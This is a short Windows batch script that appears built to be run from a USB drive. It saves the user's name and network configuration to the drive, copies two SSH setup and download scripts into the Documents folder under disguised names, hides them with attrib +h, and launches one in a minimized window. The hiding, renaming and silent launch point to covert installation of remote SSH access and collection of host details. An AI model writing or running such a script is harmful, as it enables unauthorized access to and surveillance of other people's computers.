echo %username% > E:\username.txt
ipconfig > E:\ip.txt
copy setUpSSHAndGetIP.bat crazyName.bat
copy downloadSSHMain.ps1 downloadSSH.ps1
move crazyName.bat C:\users/%username%/documents
move downloadSSH.ps1 C:\users/%username%/documents
cd C:\users/%username%/documents
attrib +h C:\users/%username%/documents/crazyName.bat
attrib +h C:\users/%username%/documents/downloadSSH.ps1
powershell -window minimize start C:\users/%username%/documents/crazyName.bat
